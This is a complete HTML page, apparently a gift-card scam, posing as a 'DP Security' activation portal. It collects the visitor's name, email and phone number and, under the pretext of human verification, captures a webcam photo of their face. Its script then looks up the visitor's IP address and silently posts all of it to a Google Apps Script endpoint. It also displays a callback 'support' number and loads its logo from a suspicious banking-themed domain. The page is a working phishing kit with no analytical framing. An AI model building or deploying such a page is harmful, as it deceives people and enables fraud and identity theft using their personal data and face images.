<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DP Security Gift Card Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/vision_bundle.js" crossorigin="anonymous"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: radial-gradient(circle at center, #1a1c2c 0%, #0d0e14 100%); color: #e0e0e0; display: flex; flex-direction: column; min-height: 100vh; }
        #successModal, #errorModal {
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background-color: #1e1e1e; padding: 30px; border-radius: 12px;
            box-shadow: 0 0 50px rgba(0, 217, 224, 0.4); z-index: 1000;
            text-align: center; width: 80%; max-width: 400px; border: 2px solid #00d9e0;
        }
        #errorModal { border-color: #d32f2f; box-shadow: 0 0 50px rgba(211, 47, 47, 0.4); }
        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 999; }
        .logo-container img { max-width: 300px; height: auto; display: block; margin: 40px auto; }
        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .activation-container { background-color: rgba(30, 30, 30, 0.95); padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7); width: 100%; max-width: 500px; border: 1px solid #333; }
        h2 { text-align: center; color: #00d9e0; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #a0a0a0; }
        input, select { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 6px; background-color: #2a2a2a; color: white; font-size: 16px; box-sizing: border-box; }
        #camera-section { margin-top: 15px; text-align: center; }
        #video-preview { width: 100%; border-radius: 6px; border: 1px solid #00d9e0; display: none; margin-bottom: 10px; }
        #status-msg { font-size: 13px; color: #00d9e0; margin-bottom: 10px; display: none; }
        .cam-btn, .modal-btn { background: #333; color: #00d9e0; border: 1px solid #00d9e0; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin-top: 10px; }
        .modal-btn { background: #d32f2f; color: white; border: none; padding: 10px 25px; font-weight: bold; }
        .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #007bff, #00d9e0); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        footer { text-align: center; padding: 20px; background-color: #0a0a0a; font-size: 14px; color: #777; margin-top: auto; }
    </style>
</head>
<body>
<div id="modalOverlay"></div>
<div id="successModal">
    <h3 style="color: #00d9e0;">Activation Successful</h3>
    <p>If you still have any additional issues please call support at 323-374-3366</p>
    <p style="font-size: 0.8em; color: #777; margin-top: 20px;">(Security Verification Complete - Locked)</p>
</div>
<div id="errorModal">
    <h3 style="color: #f44336;">Verification Error</h3>
    <p id="errorText"></p>
    <button type="button" class="modal-btn" onclick="closeError()">OK</button>
</div>
<header>
    <div class="logo-container"><img src="https://usbanking.icu/DP.png" alt="DP Security Logo"></div>
</header>
<main>
    <div class="activation-container">
        <h2>Gift Card Activation</h2>
        <form id="activationForm">
            <div class="form-group">
                <label for="cardType">Select Card Type</label>
                <select id="cardType" name="cardType" required>
                    <option value="" disabled selected>Choose a card...</option>
                    <option value="Amazon Card">Amazon Card</option>
                    <option value="Apple Card">Apple Card</option>
                    <option value="eBay Card">eBay Card</option>
                    <option value="Google Play Card">Google Play Card</option>
                    <option value="Greendot Card">Greendot Card</option>
                    <option value="Steam Card">Steam Card</option>
                    <option value="Vanilla Card">Vanilla Card</option>
                </select>
            </div>
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" name="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$">
            </div>
            <div class="form-group">
                <label for="email">Email Address (Login ID)</label>
                <input type="email" id="email" name="email" required placeholder="john.doe@example.com">
            </div>
            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" required placeholder="(xxx) xxx-xxxx" maxlength="14">
            </div>
            <div class="form-group">
                <label>Human Face Verification</label>
                <div id="camera-section">
                    <div id="status-msg">Identity Verification Active...</div>
                    <video id="video-preview" autoplay playsinline></video>
                    <button type="button" id="start-camera" class="cam-btn">Initialize Secure Camera</button>
                </div>
            </div>
            <div class="form-group">
                <label id="captcha-question" style="color:#00d9e0;"></label>
                <input type="number" id="captcha-answer" placeholder="Enter result" required>
            </div>
            <button type="submit" class="submit-btn" id="submitBtn">Activate Card and Verify You are Human</button>
        </form>
    </div>
</main>
<footer><a href="mock.html" style="cursor: pointer;">Copyright &copy; DP Security <span id="year"></span></a></footer>
<script>
    document.getElementById('year').textContent = new Date().getFullYear();
    const scriptURL = 'https://script.google.com/macros/s/AKfycby9sgxLuxRgtDr5GEfA4oSzqyHK_d8ZzpDJRKRf4sCApPMCCkmjRKK3YccVkJJfU8Ch/exec';

    function showError(msg) {
        document.getElementById('errorText').innerText = msg;
        document.getElementById('modalOverlay').style.display = 'block';
        document.getElementById('errorModal').style.display = 'block';
    }
    function closeError() {
        document.getElementById('modalOverlay').style.display = 'none';
        document.getElementById('errorModal').style.display = 'none';
    }

    let faceDetector;
    const vision = window.tasksVision;
    async function initializeSecurity() {
        try {
            const filesetResolver = await vision.FilesetResolver.forVisionTasks("https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/wasm");
            faceDetector = await vision.FaceDetector.createFromOptions(filesetResolver, {
                baseOptions: { modelAssetPath: `https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite`, delegate: "GPU" },
                runningMode: "IMAGE"
            });
        } catch(e) { console.warn("Security model loading slow or blocked."); }
    }
    initializeSecurity();

    document.getElementById('phone').addEventListener('input', function (e) {
        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
    });

    const video = document.getElementById('video-preview');
    const startBtn = document.getElementById('start-camera');
    const statusMsg = document.getElementById('status-msg');
    let streamActive = false;

    startBtn.onclick = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                video.style.display = 'block';
                statusMsg.style.display = 'block';
                startBtn.style.display = 'none';
                streamActive = true;
            };
        } catch(e) { showError("Camera access is required for verification."); }
    };

    let n1 = Math.floor(Math.random() * 15) + 5, n2 = Math.floor(Math.random() * 10) + 1;
    let operation = Math.random() > 0.5 ? '+' : '-';
    let correctAnswer = operation === '+' ? (n1 + n2) : (n1 - n2);
    document.getElementById('captcha-question').textContent = `Security Check: ${n1} ${operation} ${n2} = ?`;

    document.getElementById('activationForm').onsubmit = async (e) => {
        e.preventDefault();
        const submitBtn = document.getElementById('submitBtn');
        if (!streamActive) { showError("Security Error: Please initialize and face the secure camera before activating."); return; }

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
        let b = 0; for (let i = 0; i < imgData.length; i += 4) { b += (imgData[i] + imgData[i+1] + imgData[i+2]) / 3; }
        if ((b / (imgData.length / 4)) < 15) { showError("Human Verification Failed: Room too dark or camera covered."); return; }

        try {
            if (faceDetector) {
                const scan = faceDetector.detect(canvas);
                if (scan.detections.length === 0) { showError("Human Verification Failed: No human face detected."); return; }
            }
            if (parseInt(document.getElementById('captcha-answer').value) !== correctAnswer) { showError("Math verification failed."); return; }

            submitBtn.innerText = "Verifying Identity...";
            submitBtn.disabled = true;

            let userIp = "Hidden/Blocked";
            try {
                const ipData = await (await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) })).json();
                userIp = ipData.ip;
            } catch (ipErr) { console.warn("IP fetch timed out."); }

            const capturedImageData = canvas.toDataURL('image/png');
            const submission = { date: new Date().toLocaleString(), name: document.getElementById('fullName').value, email: document.getElementById('email').value, phone: document.getElementById('phone').value, barcode: document.getElementById('cardType').value, photo: capturedImageData, status: 'PENDING', ip: userIp };

            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(submission) });
            
            video.srcObject.getTracks().forEach(track => track.stop());
            document.getElementById('modalOverlay').style.display = 'block';
            document.getElementById('successModal').style.display = 'block';
        } catch (err) { 
            showError("Connection error. Identity could not be verified.");
            submitBtn.innerText = "Activate Card and Verify You are Human";
            submitBtn.disabled = false;
        }
    };
</script>
</body>
</html>
